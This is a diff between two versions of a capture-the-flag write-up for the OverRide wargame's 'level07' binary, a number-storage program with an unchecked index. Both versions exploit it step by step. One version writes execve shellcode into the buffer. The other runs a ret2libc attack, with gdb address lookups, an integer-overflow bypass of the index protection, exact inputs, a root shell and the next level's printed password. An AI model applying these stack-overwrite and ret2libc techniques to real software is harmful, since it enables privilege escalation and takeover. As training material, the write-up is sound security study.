@@ -1,69 +1,139 @@
-Level07
+We can see the program erases arguments and environment variables, thus protecting against:
 
-This binary provides a simple number storing interface with three commands:
+passing malicious shellcode as arguments to the program
+storing malicious shellcode in environment variables
+We also know the following:
 
-    store, saves input number (int == 4 bytes) at input index (offset = index * 4).
-    read, display number stored at input index.
-    quit, exit the program.
+the program creates a data table, where it stores numbers at indexes
+some indexes (index % 3 == 0) are protected
+Vulnerability: no check is performed on indexes and an unsigned int table is stored on the stack. This means we can read and store in stack memory.
 
-This effectively allows us to write anything we want on the stack 4 bytes at a time. We will overwrite the EIP save to take control of the execution flow and redirect to some shellcode. However there is a input index % 3 check that prevents us from saving at any index that is divisible by 3. To obtain the correct offset to save the value at, the program takes the input index and shl eax, 2 which effectively multiplies by 4.
+Our plan is to do a ret2libc attack, by overwriting the index containing EIP with a call to system() + exit() + "/bin/sh".
 
-To store at an index divisible by 3, we can simply input a value that will overflow to the true index value after the shl eax, 2. For example, to store at index 0, we can input 1073741824. Debugging is easy with the read command.
-Obtaining RET offset index
+find the address of system, exit, bin/sh
+calculate the 'index' of EIP
+use maxint overflow to access protected indexes
+run exploit by inputting malicious number + index to running program
+Find the address of system, exit, bin/sh
+level07@OverRide:~$ gdb -q level07
 
-Lets find the EIP save relative to the start of the buffer: 4 pushed registers (16) and esp, 0xfffffff0 (alignment to 16 bytes, removed 12 bytes) size of stack: 0x1d0 (464) start of buffer: esp+0x24 (36)
+(gdb) b*main
+Breakpoint 1 at 0x8048723
+(gdb) run
+[...]
 
-(464-36+16+12)/4 = 114
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
 
-Find the integer that will overflow to 114 * 4: 1073741824 (a quarter of UINT_MAX) 1073741824 + 114 1073741938
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
 
-We can use read command to check if we are storing at the correct index (it should segfault when we quit)
+(gdb) find &system,+9999999,"/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb) x/s 0xf7f897ec
+0xf7f897ec:	 "/bin/sh"
+Ok, here are our addresses:
 
-./level07
+system() is at 0xf7e6aed0
+exit() is at 0xf7e5eb70
+"/bin/sh" is at 0xf7f897ec
+Calculate the 'index' of EIP
+Once we find the index in the table where we reach EIP, we can then store our payload there using store_number().
+
+EIP's return address in the main() function is 0xffffd6bc.
+
+(gdb) info frame
+Stack level 0, frame at 0xffffd6c0:
+ eip = 0x8048723 in main; saved eip 0xf7e45513
+ Arglist at unknown address.
+ Locals at unknown address, Previous frame's sp is 0xffffd6c0
+ Saved registers:
+  eip at 0xffffd6bc
+The table's address is 0xffffd4f4.
+
+(gdb) b*store_number+6
+(gdb) r
+[...]
 Input command: store
- Number: 45
+
+(gdb) p $ebp+0x8
+$1 = (void *) 0xffffd4d0  # int *data
+(gdb) x/a 0xffffd4d0
+0xffffd4d0:	0xffffd4f4  # data[0]
+Next, we need to calculate the 'index' of our EIP address.
+
+  0xffffd63c   -    0xffffd474    =    int(0x1c8)  =   456
+[eip_address]     [table_address]                    [bytes]
+
+456 / 4   =   114
+          [index in table]
+
+114 % 3 = 0
+Ah... index 114 is protected: 114 % 3 = 0. We can't store a number at this index.
+
+Use maxint overflow to access protected indexes
+On lines 152-158 of the disassembled binary, we see that the table is accessed as data[index * 4]. Since the index is an unsigned int and multiplied by 4, we can overflow uintmax to give the index where we want to go.
+
+0x100000000 = 2^32
+[size of uintmax]
+
+(2^32 / 4) + 114 = 1073741938
+                  [index 114, after overflow]
+
+1073741938 % 3 = 1
+Index 1073741938 is unprotected!
+
+Let's test it out by causing the program to segfault.
+
+(gdb) run
+
+Input command: store
+ Number: 1094795585   # decimal for 0x41414141 or 'AAAA'
+ Index: 1073741938    # index 114
+ Completed store command successfully
+Input command: quit
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+Build exploit
+Let's structure our exploit:
+
+[ address of EIP ] = [ address of system ] [ address of exit ] [ address of "/bin/sh" ]
+   0xffffd6bc           0xf7e6aed0           0xf7e5eb70             0xf7f897ec          # address
+                        4159090384           4159040368             4160264172          # in decimal, to be number input
+                            |                     |                     |
+                        1073741938           115                    115                 # index to use
+                        data[114]            data[115]              data[116]   
+Let's give it a go!
+
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
  Index: 1073741938
  Completed store command successfully
-Input command: read
- Index: 114
- Number at data[114] is 45
- Completed read command successfully
+Input command: store
+ Number: 4159040368
+ Index: 115
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
 Input command: quit
-Segmentation fault (core dumped)
-
-Injecting our shellcode
-
-This program flushes environment variables and globals at the start of the execution disabling us from using them to store our shellcode. We will have to store the shellcode inside the databasei buffer. Lets find the address of our buffer:
-
-gdb level07
-b *0x08048795	; its address is loaded into ebx here
-r
-Breakpoint 1, 0x08048795 in main ()
-p (void*)$ebx
-$1 = (void *) 0xffffd504
-
-printf %d 0xffffd504
-4294956292
-
-Because gdb adds runtime environment variables, the address of our buffer is innacurate, adding some '\90' instruction padding and increasing our address by 32 bytes is enough to reach it. 4294956292 + 32 = 4294956324
-
-Our shellcode:
-
-\x90\x90\x90\x90 \x90\x90\x90\x90 \x90\x90\x90\x90 \x90\x90\x90\x90 		
-\x6a\x0b\x58\x99 \x52\x68\x2f\x2f \x73\x68\x68\x2f \x62\x69\x6e\x89 		
-\xe3\x31\xc9\xcd \x80 ; 21 bytes execv() shellcode + 16 bytes of padding		
-
-All that is left is placing our shellcode inside the buffer:
-
-    divide into 4 bytes sections
-    reverse them
-    convert to decimal
-    store them starting from index 0 (using the overflow exploit)
-
-To save time debugging we can list in a file all the commands to be passed to the program. (see ressource).
-
-cat /tmp/inj07 - | ./level07
-
-Input command: quit
+$ whoami
+level08
 $ cat /home/users/level08/.pass
 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
